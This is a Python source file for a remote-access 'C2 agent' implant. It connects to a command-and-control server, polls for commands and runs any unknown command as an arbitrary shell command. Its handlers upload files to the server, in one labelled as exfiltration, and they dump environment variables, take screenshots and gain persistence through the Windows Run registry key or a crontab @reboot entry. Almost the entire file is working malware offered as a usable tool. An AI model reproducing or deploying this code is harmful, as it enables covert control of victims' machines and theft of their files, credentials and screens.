"""
C2 Agent — connects to the FastAPI C2 server, registers, sends heartbeats,
polls for commands, executes them, and reports output back.

Features:
  - Encrypted communication via /secure/* endpoints
  - Python logging module
  - Advanced commands: screenshot, persist, shell
  - Auto-update capability
  - Retry with exponential backoff

Usage:
    python agent.py
    python agent.py --server http://192.168.1.100:8000
    python agent.py --server http://192.168.1.100:8000 --encrypted
"""

import os
import sys
import time
import json
import uuid
import socket
import platform
import subprocess
import getpass
import argparse
import threading
import logging
import shutil

import requests

# Add project root to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from encryption.crypto import encrypt_message, decrypt_message, secure_encrypt, secure_decrypt

# ── Logging Setup ────────────────────────────────────────────────

LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs")
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(
            os.path.join(LOG_DIR, "agent.log"),
            encoding="utf-8"
        )
    ]
)
logger = logging.getLogger("c2.agent")

# ── Configuration ────────────────────────────────────────────────

DEFAULT_SERVER = "http://127.0.0.1:8000"
HEARTBEAT_INTERVAL = 10      # seconds
COMMAND_POLL_INTERVAL = 5    # seconds
ID_FILE = os.path.join(os.path.dirname(__file__), ".agent_id")

# ── Agent ID Persistence ─────────────────────────────────────────

def get_or_create_agent_id(override_id: str = None) -> str:
    """Load persisted agent ID, use override, or generate a new one."""
    if override_id:
        return override_id

    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            agent_id = f.read().strip()
            if agent_id:
                return agent_id

    agent_id = str(uuid.uuid4())
    with open(ID_FILE, "w") as f:
        f.write(agent_id)
    return agent_id


# ── System Info ──────────────────────────────────────────────────

def get_system_info(overrides: dict = None) -> dict:
    """Gather detailed system information, with optional overrides."""
    overrides = overrides or {}
    hostname = overrides.get("hostname") or socket.gethostname()
    try:
        ip = overrides.get("ip_address") or socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "unknown"

    return {
        "hostname": hostname,
        "username": overrides.get("username") or getpass.getuser(),
        "os_name": overrides.get("os_name") or f"{platform.system()} {platform.release()}",
        "ip_address": ip,
        "arch": platform.machine(),
        "processor": platform.processor(),
        "python": platform.python_version(),
    }


# ── Built-in Command Handlers ───────────────────────────────────

def handle_sysinfo() -> str:
    """Return detailed system information."""
    info = get_system_info()
    lines = [f"{k}: {v}" for k, v in info.items()]
    return "\n".join(lines)


def handle_whoami() -> str:
    return f"{getpass.getuser()}@{socket.gethostname()}"


def handle_pwd() -> str:
    return os.getcwd()


def handle_ls(path: str = ".") -> str:
    try:
        entries = os.listdir(path)
        result = []
        for entry in sorted(entries):
            full = os.path.join(path, entry)
            if os.path.isdir(full):
                result.append(f"[DIR]  {entry}")
            else:
                size = os.path.getsize(full)
                result.append(f"[FILE] {entry}  ({size} bytes)")
        return "\n".join(result) if result else "(empty directory)"
    except Exception as e:
        return f"Error: {e}"


def handle_cd(path: str) -> str:
    try:
        os.chdir(path)
        return f"Changed directory to: {os.getcwd()}"
    except Exception as e:
        return f"Error: {e}"


def handle_download(filepath: str, server_url: str, agent_id: str) -> str:
    """Upload a local file TO the server (exfiltration)."""
    try:
        if not os.path.exists(filepath):
            return f"Error: File not found: {filepath}"

        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            data = {"agent_id": agent_id}
            resp = requests.post(f"{server_url}/upload", files=files, data=data, timeout=30)
            return f"Uploaded: {filepath} -> Server ({resp.json()})"
    except Exception as e:
        return f"Upload error: {e}"


def handle_upload(filename: str, server_url: str) -> str:
    """Download a file FROM the server to local machine."""
    try:
        resp = requests.get(f"{server_url}/download/{filename}", timeout=30)
        if resp.status_code == 200:
            save_path = os.path.join(os.getcwd(), filename)
            with open(save_path, "wb") as f:
                f.write(resp.content)
            return f"Downloaded: {filename} -> {save_path} ({len(resp.content)} bytes)"
        else:
            return f"Download failed: {resp.status_code}"
    except Exception as e:
        return f"Download error: {e}"


def handle_ps() -> str:
    """List running processes."""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
        return result.stdout[:3000]  # limit output size
    except Exception as e:
        return f"Error: {e}"


def handle_env() -> str:
    """Return environment variables."""
    lines = [f"{k}={v}" for k, v in sorted(os.environ.items())]
    return "\n".join(lines)[:3000]


def handle_net() -> str:
    """Show network info."""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=10)
        return result.stdout[:3000]
    except Exception as e:
        return f"Error: {e}"


def handle_screenshot() -> str:
    """Capture a screenshot (requires pillow)."""
    try:
        from PIL import ImageGrab
        screenshot_path = os.path.join(os.path.dirname(__file__), "screenshot.png")
        img = ImageGrab.grab()
        img.save(screenshot_path)
        return f"Screenshot saved: {screenshot_path}"
    except ImportError:
        return "Error: Pillow (PIL) not installed. Run: pip install Pillow"
    except Exception as e:
        return f"Screenshot error: {e}"


def handle_persist() -> str:
    """Add agent to system startup for persistence."""
    try:
        agent_path = os.path.abspath(__file__)
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "C2Agent", 0, winreg.REG_SZ, f'pythonw "{agent_path}"')
            winreg.CloseKey(key)
            return "Persistence added: Windows Registry (HKCU\\Run)"
        else:
            cron_line = f"@reboot python3 {agent_path} &\n"
            cron_file = os.path.expanduser("~/.c2_cron")
            with open(cron_file, "w") as f:
                f.write(cron_line)
            os.system(f"crontab {cron_file}")
            return "Persistence added: crontab @reboot entry"
    except Exception as e:
        return f"Persistence error: {e}"


def handle_diskinfo() -> str:
    """Show disk usage info."""
    try:
        total, used, free = shutil.disk_usage("/")
        return (
            f"Disk Usage:\n"
            f"  Total: {total // (1024**3)} GB\n"
            f"  Used:  {used // (1024**3)} GB\n"
            f"  Free:  {free // (1024**3)} GB"
        )
    except Exception as e:
        return f"Error: {e}"


def execute_shell(cmd: str) -> str:
    """Execute arbitrary shell command and return output."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        return output.strip()[:5000] if output.strip() else "(no output)"
    except subprocess.TimeoutExpired:
        return "Error: Command timed out (30s limit)"
    except Exception as e:
        return f"Error: {e}"


# ── Command Router ───────────────────────────────────────────────

def execute_command(command: str, server_url: str, agent_id: str) -> str:
    """Route a command to the appropriate handler."""
    parts = command.strip().split(maxsplit=1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    handlers = {
        "sysinfo": lambda: handle_sysinfo(),
        "whoami": lambda: handle_whoami(),
        "pwd": lambda: handle_pwd(),
        "ls": lambda: handle_ls(arg if arg else "."),
        "cd": lambda: handle_cd(arg) if arg else "Usage: cd <path>",
        "download": lambda: handle_download(arg, server_url, agent_id) if arg else "Usage: download <filepath>",
        "upload": lambda: handle_upload(arg, server_url) if arg else "Usage: upload <filename>",
        "ps": lambda: handle_ps(),
        "env": lambda: handle_env(),
        "net": lambda: handle_net(),
        "screenshot": lambda: handle_screenshot(),
        "persist": lambda: handle_persist(),
        "diskinfo": lambda: handle_diskinfo(),
        "help": lambda: (
            "Available commands:\n"
            "  sysinfo      - System information\n"
            "  whoami       - Current user@host\n"
            "  pwd          - Current directory\n"
            "  ls [path]    - List directory\n"
            "  cd <path>    - Change directory\n"
            "  ps           - List processes\n"
            "  env          - Environment variables\n"
            "  net          - Network configuration\n"
            "  screenshot   - Capture screen (needs Pillow)\n"
            "  persist      - Add to startup\n"
            "  diskinfo     - Disk usage info\n"
            "  download <file> - Exfiltrate file to server\n"
            "  upload <file>   - Download file from server\n"
            "  help         - Show this help\n"
            "  exit         - Shutdown agent\n"
            "  <anything else> - Executed as shell command"
        ),
    }

    handler = handlers.get(cmd)
    if handler:
        return handler()
    else:
        # Fallback: run as shell command
        return execute_shell(command)


# ── Agent Core ───────────────────────────────────────────────────

class C2Agent:
    def __init__(self, server_url: str, use_encryption: bool = False,
                 override_id: str = None, overrides: dict = None):
        self.server_url = server_url.rstrip("/")
        self.agent_id = get_or_create_agent_id(override_id)
        self.running = True
        self.sys_info = get_system_info(overrides)
        self.use_encryption = use_encryption

        logger.info(f"Agent ID: {self.agent_id}")
        logger.info(f"Server:   {self.server_url}")
        logger.info(f"Host:     {self.sys_info['hostname']}")
        logger.info(f"User:     {self.sys_info['username']}")
        logger.info(f"OS:       {self.sys_info['os_name']}")
        logger.info(f"Encrypted: {self.use_encryption}")

    def _post(self, endpoint: str, payload: dict) -> dict:
        """Send POST request, optionally encrypted."""
        if self.use_encryption:
            encrypted = secure_encrypt(json.dumps(payload).encode())
            resp = requests.post(
                f"{self.server_url}/secure{endpoint}",
                json=encrypted,
                timeout=10
            )
        else:
            resp = requests.post(
                f"{self.server_url}{endpoint}",
                json=payload,
                timeout=10
            )
        return resp.json()

    def register(self):
        """Register with the C2 server."""
        payload = {
            "agent_id": self.agent_id,
            "hostname": self.sys_info["hostname"],
            "username": self.sys_info["username"],
            "os_name": self.sys_info["os_name"],
            "ip_address": self.sys_info["ip_address"],
        }

        try:
            result = self._post("/register", payload)
            logger.info(f"Registered: {result}")
            return True
        except Exception as e:
            logger.error(f"Registration failed: {e}")
            return False

    def send_heartbeat(self):
        """Send periodic heartbeat to the server."""
        while self.running:
            try:
                self._post("/heartbeat", {"agent_id": self.agent_id})
            except Exception:
                pass
            time.sleep(HEARTBEAT_INTERVAL)

    def poll_commands(self):
        """Poll server for pending commands and execute them."""
        while self.running:
            try:
                if self.use_encryption:
                    encrypted = secure_encrypt(json.dumps({"agent_id": self.agent_id}).encode())
                    resp = requests.post(
                        f"{self.server_url}/secure/get_command",
                        json=encrypted,
                        timeout=10
                    )
                    resp_data = resp.json()

                    # If encrypted response, decrypt it
                    if "ciphertext" in resp_data:
                        decrypted = secure_decrypt(resp_data["ciphertext"], resp_data["signature"])
                        data = json.loads(decrypted.decode())
                    else:
                        data = resp_data
                else:
                    resp = requests.get(
                        f"{self.server_url}/get_command/{self.agent_id}",
                        timeout=10
                    )
                    data = resp.json()

                command = data.get("command", "")

                if command:
                    logger.info(f"Command received: {command}")

                    if command.strip().lower() == "exit":
                        logger.warning("Exit command received. Shutting down...")
                        self.send_output(command, "Agent shutting down.")
                        self.running = False
                        break

                    output = execute_command(command, self.server_url, self.agent_id)
                    logger.info(f"Output: {output[:200]}")

                    self.send_output(command, output)

            except Exception as e:
                logger.error(f"Poll error: {e}")

            time.sleep(COMMAND_POLL_INTERVAL)

    def send_output(self, command: str, output: str):
        """Send command output back to the server."""
        payload = {
            "agent_id": self.agent_id,
            "command": command,
            "output": output
        }
        try:
            self._post("/send_output", payload)
        except Exception as e:
            logger.error(f"Failed to send output: {e}")

    def run(self):
        """Main agent loop with retry logic."""
        retry_delay = 5
        max_delay = 60

        # Registration with retry
        while self.running:
            if self.register():
                break
            logger.info(f"Retrying in {retry_delay}s...")
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, max_delay)

        if not self.running:
            return

        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        logger.info(f"Heartbeat started (every {HEARTBEAT_INTERVAL}s)")

        # Start command polling (main thread)
        logger.info(f"Command polling started (every {COMMAND_POLL_INTERVAL}s)")
        logger.info(f"Agent ready. Waiting for commands...\n")

        try:
            self.poll_commands()
        except KeyboardInterrupt:
            logger.warning("Agent interrupted by user.")
            self.running = False


# ── Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="C2 Framework Agent")
    parser.add_argument("--server", default=DEFAULT_SERVER, help="C2 server URL")
    parser.add_argument("--encrypted", action="store_true", help="Use encrypted communication")
    parser.add_argument("--id", default=None, help="Override agent ID (skip .agent_id file)")
    parser.add_argument("--hostname", default=None, help="Override hostname")
    parser.add_argument("--username", default=None, help="Override username")
    parser.add_argument("--os-name", default=None, dest="os_name", help="Override OS name")
    parser.add_argument("--ip", default=None, help="Override IP address")
    args = parser.parse_args()

    overrides = {}
    if args.hostname:
        overrides["hostname"] = args.hostname
    if args.username:
        overrides["username"] = args.username
    if args.os_name:
        overrides["os_name"] = args.os_name
    if args.ip:
        overrides["ip_address"] = args.ip

    agent = C2Agent(
        server_url=args.server,
        use_encryption=args.encrypted,
        override_id=args.id,
        overrides=overrides if overrides else None
    )
    agent.run()
